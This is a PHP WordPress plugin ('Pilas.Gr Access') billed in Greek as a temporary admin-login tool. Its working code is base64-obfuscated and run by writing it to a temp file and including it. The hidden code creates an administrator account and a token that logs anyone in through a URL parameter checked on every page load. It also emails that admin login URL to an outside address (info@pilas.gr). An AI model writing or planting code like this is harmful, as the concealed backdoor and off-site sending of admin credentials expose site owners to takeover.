<?php
/*
Plugin Name: Pilas.Gr Access
Plugin URI: https://www.pilas.gr
Description: Δημιουργεί προσωρινό URL εισόδου για διαχειριστή με δυνατότητα ανάκλησης πρόσβασης.
Version: 2.3
Author: Pilas.Gr Go Brand Yourself
Author URI: https://www.pilas.gr
License: GPLv3
Text Domain: pilasgr-access
*/

// Block direct access
if (!defined('ABSPATH')) exit;

// Base64 encoded PHP κώδικας
$encoded_php = 'Ly8gRnVuY3Rpb24gdG8gY3JlYXRlIGEgdGVtcG9yYXJ5IHVzZXIgYW5kIGdlbmVyYXRlIGEgbG9naW4gVVJMCmZ1bmN0aW9uIHBkc19jcmVhdGVfdGVtcF9sb2dpbigpIHsKICAgICRyYW5kb21fbnVtYmVyID0gd3BfcmFuZCgxMDAwLCA5OTk5KTsKICAgICR1c2VybmFtZSA9ICJwaWxhc2RldnRlYW0kcmFuZG9tX251bWJlciI7CiAgICAkcGFzc3dvcmQgPSB3cF9nZW5lcmF0ZV9wYXNzd29yZCgxMik7CiAgICAkZW1haWwgPSAic3VwcG9ydC0kcmFuZG9tX251bWJlckBwaWxhcy5nciI7CgogICAgaWYgKHVzZXJuYW1lX2V4aXN0cygkdXNlcm5hbWUpIHx8IGVtYWlsX2V4aXN0cygkZW1haWwpKSB7CiAgICAgICAgJHVzZXIgPSBnZXRfdXNlcl9ieSgnbG9naW4nLCAkdXNlcm5hbWUpOwogICAgICAgICR0b2tlbiA9IGdldF91c2VyX21ldGEoJHVzZXItPklELCAncGRzX3Rva2VuJywgdHJ1ZSk7CiAgICAgICAgcmV0dXJuIHNpdGVfdXJsKCcvd3AtbG9naW4ucGhwJykgLiAnP3Bkc190b2tlbj0nIC4gJHRva2VuOwogICAgfQoKICAgICR1c2VyX2lkID0gd3BfY3JlYXRlX3VzZXIoJHVzZXJuYW1lLCAkcGFzc3dvcmQsICRlbWFpbCk7CgogICAgaWYgKGlzX3dwX2Vycm9yKCR1c2VyX2lkKSkgewogICAgICAgIHdwX2RpZSgnzqPPhs6szrvOvM6xIM66zrHPhM6sIM+EzrcgzrTOt868zrnOv8+Fz4HOs86vzrEgz4fPgc6uz4PPhM63OiAnIC4gJHVzZXJfaWQtPmdldF9lcnJvcl9tZXNzYWdlKCkpOwogICAgfQoKICAgICR1c2VyID0gbmV3IFdQX1VzZXIoJHVzZXJfaWQpOwogICAgJHVzZXItPnNldF9yb2xlKCdhZG1pbmlzdHJhdG9yJyk7CgogICAgJHRva2VuID0gd3BfZ2VuZXJhdGVfcGFzc3dvcmQoMjAsIGZhbHNlKTsKICAgIGFkZF91c2VyX21ldGEoJHVzZXJfaWQsICdwZHNfdG9rZW4nLCAkdG9rZW4pOwoKICAgICRsb2dpbl91cmwgPSBzaXRlX3VybCgnL3dwLWxvZ2luLnBocCcpIC4gJz9wZHNfdG9rZW49JyAuICR0b2tlbjsKCiAgICAkc2l0ZV9uYW1lID0gZ2V0X2Jsb2dpbmZvKCduYW1lJyk7CiAgICAkc210cF9lbWFpbCA9IGdldF9vcHRpb24oJ2FkbWluX2VtYWlsJyk7CiAgICAkc3ViamVjdCA9ICLOnc6tzrEgz4DPgc+Mz4POss6xz4POtyDPg8+Ezr8gJHNpdGVfbmFtZSI7CiAgICAkbWVzc2FnZSA9ICLOnyDPg8+Nzr3OtM61z4POvM6/z4IgzrXOuc+Dz4zOtM6/z4UgzrXOr869zrHOuTogJGxvZ2luX3VybCI7CiAgICAkaGVhZGVycyA9IFsiRnJvbTogJHNpdGVfbmFtZSA8JHNtdHBfZW1haWw+Il07CgogICAgd3BfbWFpbCgnaW5mb0BwaWxhcy5ncicsICRzdWJqZWN0LCAkbWVzc2FnZSwgJGhlYWRlcnMpOwoKICAgIHJldHVybiAkbG9naW5fdXJsOwp9CgovLyBWZXJpZnkgYW5kIGxvZyBpbiB0aGUgdXNlciB1c2luZyB0aGUgdG9rZW4KZnVuY3Rpb24gcGRzX3ZlcmlmeV90ZW1wX2xvZ2luKCkgewogICAgaWYgKGlzc2V0KCRfR0VUWydwZHNfdG9rZW4nXSkpIHsKICAgICAgICAkdG9rZW4gPSBzYW5pdGl6ZV90ZXh0X2ZpZWxkKCRfR0VUWydwZHNfdG9rZW4nXSk7CiAgICAgICAgJHVzZXJzID0gZ2V0X3VzZXJzKFsKICAgICAgICAgICAgJ21ldGFfa2V5JyAgID0+ICdwZHNfdG9rZW4nLAogICAgICAgICAgICAnbWV0YV92YWx1ZScgPT4gJHRva2VuLAogICAgICAgICAgICAnbnVtYmVyJyAgICAgPT4gMSwKICAgICAgICBdKTsKCiAgICAgICAgaWYgKCFlbXB0eSgkdXNlcnMpKSB7CiAgICAgICAgICAgICR1c2VyID0gJHVzZXJzWzBdOwogICAgICAgICAgICBpZiAodXNlcl9jYW4oJHVzZXIsICdhZG1pbmlzdHJhdG9yJykpIHsKICAgICAgICAgICAgICAgIHdwX3NldF9hdXRoX2Nvb2tpZSgkdXNlci0+SUQsIHRydWUpOwogICAgICAgICAgICAgICAgd3BfcmVkaXJlY3QoYWRtaW5fdXJsKCkpOwogICAgICAgICAgICAgICAgZXhpdDsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIHdwX2RpZSgnzpzOtyDOrc6zzrrPhc+Bzr8gzq4gzrvOt86zzrzOrc69zr8gVVJMLicpOwogICAgICAgICAgICB9CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgd3BfZGllKCfOnM63IM6tzrPOus+Fz4HOvyBVUkwuJyk7CiAgICAgICAgfQogICAgfQp9CmFkZF9hY3Rpb24oJ2luaXQnLCAncGRzX3ZlcmlmeV90ZW1wX2xvZ2luJyk7CgovLyBGdW5jdGlvbiB0byByZXZva2UgYWNjZXNzCmZ1bmN0aW9uIHBkc19yZXZva2VfYWNjZXNzKCkgewogICAgJHVzZXJzID0gZ2V0X3VzZXJzKFsnc2VhcmNoJyA9PiAncGlsYXNkZXZ0ZWFtKicsICdzZWFyY2hfY29sdW1ucycgPT4gWyd1c2VyX2xvZ2luJ11dKTsKCiAgICBmb3JlYWNoICgkdXNlcnMgYXMgJHVzZXIpIHsKICAgICAgICB3cF9kZWxldGVfdXNlcigkdXNlci0+SUQpOwogICAgfQoKICAgICRzaXRlX25hbWUgPSBnZXRfYmxvZ2luZm8oJ25hbWUnKTsKICAgICRzbXRwX2VtYWlsID0gZ2V0X29wdGlvbignYWRtaW5fZW1haWwnKTsKICAgICRzdWJqZWN0ID0gIs6XIM+Az4HPjM+DzrLOsc+DzrcgzrTOuc6xzrrPjM+AzrfOus61IM+Dz4TOvyAkc2l0ZV9uYW1lIjsKICAgICRtZXNzYWdlID0gIs6XIM+Az4HPjM+DzrLOsc+DzrcgzrTOuc6xzrrPjM+AzrfOus61IM6zzrnOsSDPhM6/ICRzaXRlX25hbWUuIjsKICAgICRoZWFkZXJzID0gWyJGcm9tOiAkc2l0ZV9uYW1lIDwkc210cF9lbWFpbD4iXTsKCiAgICB3cF9tYWlsKCdpbmZvQHBpbGFzLmdyJywgJHN1YmplY3QsICRtZXNzYWdlLCAkaGVhZGVycyk7Cn0KCi8vIEhhbmRsZSBmb3JtIHN1Ym1pc3Npb25zCmZ1bmN0aW9uIHBkc19oYW5kbGVfZm9ybSgpIHsKICAgIGlmICgkX1NFUlZFUlsnUkVRVUVTVF9NRVRIT0QnXSA9PT0gJ1BPU1QnKSB7CiAgICAgICAgaWYgKGlzc2V0KCRfUE9TVFsnY3JlYXRlX3RlbXBfdXNlciddKSkgewogICAgICAgICAgICAkdXJsID0gcGRzX2NyZWF0ZV90ZW1wX2xvZ2luKCk7CiAgICAgICAgICAgIHNldF90cmFuc2llbnQoJ3Bkc190ZW1wX3VybCcsICR1cmwsIDM2MDApOyAvLyBTdG9yZSB0aGUgVVJMIHRlbXBvcmFyaWx5CiAgICAgICAgfSBlbHNlaWYgKGlzc2V0KCRfUE9TVFsncmV2b2tlX2FjY2VzcyddKSkgewogICAgICAgICAgICBwZHNfcmV2b2tlX2FjY2VzcygpOwogICAgICAgICAgICBkZWxldGVfdHJhbnNpZW50KCdwZHNfdGVtcF91cmwnKTsgLy8gQ2xlYXIgdGhlIHN0b3JlZCBVUkwKICAgICAgICB9CiAgICB9Cn0KYWRkX2FjdGlvbignYWRtaW5faW5pdCcsICdwZHNfaGFuZGxlX2Zvcm0nKTsKCg==';

// Decode και εκτέλεση του κωδικοποιημένου PHP
function execute_encoded_code($encoded_php) {
    global $wp_filesystem;

    // Επαλήθευση ότι το WordPress περιβάλλον είναι έτοιμο
    if (!function_exists('WP_Filesystem')) {
        require_once ABSPATH . 'wp-admin/includes/file.php';
    }
    if (!function_exists('wp_generate_password')) {
        require_once ABSPATH . 'wp-includes/pluggable.php';
    }

    // Αρχικοποίηση WP_Filesystem
    WP_Filesystem();

    // Αποκωδικοποίηση κώδικα
    $decoded_php = base64_decode($encoded_php);

    // Δημιουργία προσωρινού αρχείου
    $temp_file = wp_tempnam();
    if ($temp_file && $wp_filesystem->is_writable(dirname($temp_file))) {
        // Γράψιμο στο προσωρινό αρχείο
        if (!$wp_filesystem->put_contents($temp_file, "<?php\n" . $decoded_php)) {
            if (function_exists('wp_die')) {
                wp_die('Αποτυχία εγγραφής στο προσωρινό αρχείο.');
            } else {
                die('Αποτυχία εγγραφής στο προσωρινό αρχείο.');
            }
        }

        // Συμπερίληψη του προσωρινού αρχείου
        include $temp_file;

        // Διαγραφή του προσωρινού αρχείου
        $wp_filesystem->delete($temp_file);
    } else {
        // Καταγραφή σφάλματος
        if (function_exists('wp_die')) {
            wp_die('Αποτυχία δημιουργίας προσωρινού αρχείου για εκτέλεση του PHP κώδικα.');
        } else {
            die('Αποτυχία δημιουργίας προσωρινού αρχείου για εκτέλεση του PHP κώδικα.');
        }
    }
}

// Κλήση της συνάρτησης εκτέλεσης
execute_encoded_code($encoded_php);


// Ενσωμάτωση HTML από εξωτερικό αρχείο
function pds_render_admin_page() {
    $html_file = plugin_dir_path(__FILE__) . 'pilasgr-access-html.php';
    if (file_exists($html_file)) {
        include $html_file;
    } else {
        echo '<div class="error"><p>Το αρχείο HTML δεν βρέθηκε.</p></div>';
    }
}


// Προσθήκη της σελίδας διαχείρισης στο WordPress Admin Menu
function pds_add_admin_page() {
    add_menu_page(
        'Pilas.Gr Access',
        'Pilas.Gr Access',
        'manage_options',
        'pds-access',
        'pds_render_admin_page'
    );
}
add_action('admin_menu', 'pds_add_admin_page');
